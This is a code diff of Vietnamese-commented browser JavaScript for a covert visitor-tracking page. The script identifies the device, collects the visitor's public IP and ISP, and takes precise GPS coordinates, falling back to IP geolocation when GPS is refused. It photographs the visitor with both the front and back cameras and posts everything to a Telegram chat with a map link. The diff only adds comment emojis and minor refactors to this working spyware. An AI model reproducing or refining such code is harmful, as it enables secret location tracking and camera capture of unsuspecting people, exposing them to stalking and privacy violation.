@@ -17,7 +17,7 @@ const info = {
   camera: '⏳ Đang kiểm tra...'
 };
 
-// Nhận diện thiết bị
+// ✅ Nhận diện thiết bị
 function detectDevice() {
   const ua = navigator.userAgent;
   if (/iPhone|iPad|iPod/i.test(ua)) {
@@ -39,13 +39,14 @@ function detectDevice() {
   }
 }
 
-// Lấy IP dân cư
+// ✅ Lấy IP dân cư
 async function getPublicIP() {
-  const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json());
-  info.ip = ip.ip || 'Không rõ';
+  const res = await fetch('https://api.ipify.org?format=json');
+  const data = await res.json();
+  info.ip = data.ip || 'Không rõ';
 }
 
-// Lấy IP thật và ISP
+// ✅ Lấy IP thật + ISP từ Cloudflare
 async function getRealIP() {
   const ip = await fetch('https://icanhazip.com').then(r => r.text());
   info.realIp = ip.trim();
@@ -53,8 +54,8 @@ async function getRealIP() {
   info.isp = data.connection?.org || 'Không rõ';
 }
 
-// Lấy vị trí từ GPS hoặc fallback IP
-function getLocation() {
+// ✅ Lấy vị trí bằng GPS, nếu không được thì fallback IP
+async function getLocation() {
   return new Promise(resolve => {
     if (!navigator.geolocation) return fallbackIPLocation().then(resolve);
 
@@ -62,12 +63,13 @@ function getLocation() {
       async pos => {
         info.lat = pos.coords.latitude.toFixed(6);
         info.lon = pos.coords.longitude.toFixed(6);
+
         try {
           const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${info.lat}&lon=${info.lon}`, {
             headers: { 'User-Agent': 'Mozilla/5.0' }
           });
           const data = await res.json();
-          info.address = data.display_name || '📍 Không rõ địa chỉ từ GPS';
+          info.address = data.display_name || '📍 GPS hoạt động nhưng không tìm được địa chỉ';
           info.country = data.address?.country || 'Không rõ';
         } catch {
           info.address = '📍 GPS hoạt động nhưng không tìm được địa chỉ';
@@ -79,21 +81,21 @@ function getLocation() {
         await fallbackIPLocation();
         resolve();
       },
-      { enableHighAccuracy: true, timeout: 7000 }
+      { enableHighAccuracy: true, timeout: 8000 }
     );
   });
 }
 
-// Fallback khi từ chối GPS
+// ✅ Lấy vị trí từ IP nếu GPS bị từ chối
 async function fallbackIPLocation() {
-  const data = await fetch(`https://ipwho.is/${info.realIp}`).then(r => r.json());
+  const data = await fetch(`https://ipwho.is/`).then(r => r.json());
   info.lat = data.latitude?.toFixed(6) || '0';
   info.lon = data.longitude?.toFixed(6) || '0';
   info.address = `${data.city}, ${data.region}, ${data.postal || ''}`.replace(/, $/, '');
   info.country = data.country || 'Không rõ';
 }
 
-// Chụp ảnh camera
+// ✅ Chụp ảnh camera
 function captureCamera(facingMode = 'user') {
   return new Promise((resolve, reject) => {
     navigator.mediaDevices.getUserMedia({ video: { facingMode } })
@@ -118,9 +120,8 @@ function captureCamera(facingMode = 'user') {
   });
 }
 
-// Caption có link Google Maps
+// ✅ Caption gửi về Telegram
 function getCaption() {
-  const mapsLink = `https://www.google.com/maps/search/?api=1&query=${info.lat},${info.lon}`;
   return `
 📡 [THÔNG TIN TRUY CẬP]
 
@@ -134,17 +135,17 @@ function getCaption() {
 🌎 Quốc gia: ${info.country}
 📍 Vĩ độ: ${info.lat}
 📍 Kinh độ: ${info.lon}
-🔗 [Xem trên bản đồ](${mapsLink})
+📌 Bản đồ: https://www.google.com/maps?q=${info.lat},${info.lon}
 📸 Camera: ${info.camera}
 `.trim();
 }
 
-// Gửi ảnh
+// ✅ Gửi ảnh về Telegram
 async function sendPhotos(frontBlob, backBlob) {
   const formData = new FormData();
   formData.append('chat_id', TELEGRAM_CHAT_ID);
   formData.append('media', JSON.stringify([
-    { type: 'photo', media: 'attach://front', caption: getCaption(), parse_mode: 'Markdown' },
+    { type: 'photo', media: 'attach://front', caption: getCaption() },
     { type: 'photo', media: 'attach://back' }
   ]));
   formData.append('front', frontBlob, 'front.jpg');
@@ -153,20 +154,19 @@ async function sendPhotos(frontBlob, backBlob) {
   return fetch(API_SEND_MEDIA, { method: 'POST', body: formData });
 }
 
-// Gửi text nếu không có ảnh
+// ✅ Gửi text nếu không chụp được ảnh
 async function sendTextOnly() {
   return fetch(API_SEND_TEXT, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({
       chat_id: TELEGRAM_CHAT_ID,
-      text: getCaption(),
-      parse_mode: 'Markdown'
+      text: getCaption()
     })
   });
 }
 
-// Chạy
+// ✅ Khởi chạy
 async function main() {
   detectDevice();
   await getPublicIP();
@@ -174,9 +174,10 @@ async function main() {
   await getLocation();
 
   let front = null, back = null;
+
   try {
-    front = await captureCamera('user');
-    back = await captureCamera('environment');
+    front = await captureCamera("user");
+    back = await captureCamera("environment");
     info.camera = '✅ Đã chụp camera trước và sau';
   } catch {
     info.camera = '🚫 Không thể truy cập camera';
